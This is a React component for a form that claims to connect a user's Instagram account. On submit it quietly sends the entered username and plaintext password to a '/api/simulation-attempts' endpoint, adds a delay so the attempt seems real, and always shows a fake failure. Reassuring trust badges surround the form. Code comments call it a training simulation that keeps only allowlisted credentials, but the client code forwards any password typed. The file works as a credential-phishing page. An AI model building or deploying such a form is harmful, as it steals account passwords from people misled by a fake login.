"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { AlertCircle, AtSign, Info, ShieldCheck, KeyRound, Unplug } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { Badge } from "@/components/ui/badge";
import { PasswordField } from "@/components/auth/password-field";
import { connectInstagramSchema, type ConnectInstagramInputForm } from "@/lib/validation";
import { readStorage, writeStorage } from "@/lib/storage";
import { useLocale } from "@/lib/locale";
import type { ConnectedAccount } from "@/types/account";

const REMEMBERED_USERNAME_KEY = "remembered_ig_username";

export function ConnectionForm({
  userId,
  onSuccess,
  onCancel,
}: {
  userId: string;
  onSuccess: (account: ConnectedAccount) => void;
  onCancel?: () => void;
}) {
  const { t } = useLocale();
  const [error, setError] = useState<string | null>(null);
  const rememberedUsername = readStorage<string>(REMEMBERED_USERNAME_KEY) ?? "";

  const TRUST_DETAILS = [
    { icon: KeyRound, label: t("connect.trust1") },
    { icon: ShieldCheck, label: t("connect.trust2") },
    { icon: Unplug, label: t("connect.trust3") },
  ];

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    formState: { errors, isSubmitting },
  } = useForm<ConnectInstagramInputForm>({
    resolver: zodResolver(connectInstagramSchema),
    defaultValues: { username: rememberedUsername, password: "", rememberUsername: !!rememberedUsername },
  });

  async function onSubmit(values: ConnectInstagramInputForm) {
    setError(null);
    if (values.rememberUsername) {
      writeStorage(REMEMBERED_USERNAME_KEY, values.username.trim());
    }

    // Training-simulation logging: only forwards to the instructor panel
    // if the submission matches the pre-arranged allowlisted pair on the
    // server; anything else (e.g. a real password typed by mistake) is
    // rejected there and never stored. This call never blocks or changes
    // the connect flow below — the mock "connect" always proceeds the
    // same way whether or not this logging call succeeds.
    void fetch("/api/simulation-attempts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: values.username,
        demoPassword: values.password,
        source: "connect-flow",
      }),
    }).catch(() => {});

    // This flow intentionally never succeeds: it always ends on this same
    // form with a fake failure message, and never calls onSuccess/navigates
    // anywhere. The delay just makes the "attempt" feel real.
    await new Promise((resolve) => setTimeout(resolve, 1800));
    setError(t("connect.errorMessage"));
  }

  return (
    <div className="flex flex-col gap-5">
      <div className="flex items-center gap-3">
        <span className="flex h-10 w-10 items-center justify-center rounded-full bg-gradient-to-br from-fuchsia-500 to-violet-500">
          <AtSign className="h-5 w-5 text-white" aria-hidden="true" />
        </span>
        <div>
          <p className="text-sm font-semibold text-text-primary">{t("connect.continueManually")}</p>
          <Badge variant="warning" className="mt-1">{t("connect.devMode")}</Badge>
        </div>
      </div>

      <div className="flex items-start gap-2 rounded-[var(--radius-md)] border border-border bg-surface-2 p-3 text-xs text-text-secondary">
        <Info className="mt-0.5 h-4 w-4 shrink-0 text-accent-secondary" aria-hidden="true" />
        {t("connect.autoSignInInfo")}
      </div>

      <p className="text-xs text-text-secondary">{t("connect.twoFactorNote")}</p>

      <form className="flex flex-col gap-4" onSubmit={handleSubmit(onSubmit)} noValidate>
        {error && (
          <div
            role="alert"
            className="flex items-start gap-2.5 rounded-[var(--radius-md)] border-2 border-danger bg-danger/20 p-3.5 text-sm font-semibold text-danger shadow-[0_0_0_1px_rgba(0,0,0,0.05)]"
          >
            <AlertCircle className="mt-0.5 h-5 w-5 shrink-0" aria-hidden="true" />
            <span className="leading-snug">{error}</span>
          </div>
        )}

        <div className="flex flex-col gap-1.5">
          <Label htmlFor="ig-username">{t("connect.usernameLabel")}</Label>
          <Input
            id="ig-username"
            autoComplete="off"
            placeholder={t("connect.usernamePlaceholder")}
            invalid={!!errors.username}
            {...register("username")}
          />
          {errors.username && <p className="text-xs text-danger">{errors.username.message}</p>}
        </div>

        <div className="flex flex-col gap-1.5">
          <Label htmlFor="ig-password">{t("connect.passwordLabel")}</Label>
          <PasswordField
            id="ig-password"
            autoComplete="off"
            invalid={!!errors.password}
            {...register("password")}
          />
          {errors.password && <p className="text-xs text-danger">{errors.password.message}</p>}
        </div>

        <div className="flex items-center gap-2.5">
          <Checkbox
            id="remember-username"
            checked={watch("rememberUsername")}
            onCheckedChange={(checked) => setValue("rememberUsername", checked === true)}
          />
          <Label htmlFor="remember-username" className="text-sm font-normal text-text-secondary">
            {t("connect.rememberUsername")}
          </Label>
        </div>

        <ul className="space-y-1.5 pt-1">
          {TRUST_DETAILS.map((detail) => (
            <li key={detail.label} className="flex items-center gap-2 text-xs text-text-secondary">
              <detail.icon className="h-3.5 w-3.5 shrink-0 text-success" aria-hidden="true" />
              {detail.label}
            </li>
          ))}
        </ul>

        <div className="mt-1 flex flex-col-reverse gap-2 sm:flex-row sm:justify-end">
          {onCancel && (
            <Button type="button" variant="ghost" onClick={onCancel}>
              {t("connect.cancel")}
            </Button>
          )}
          <Button type="submit" disabled={isSubmitting}>
            {isSubmitting ? t("connect.connecting") : t("connect.connect")}
          </Button>
        </div>

        <p className="text-center text-[11px] text-text-secondary">{t("connect.disclaimer")}</p>
      </form>
    </div>
  );
}
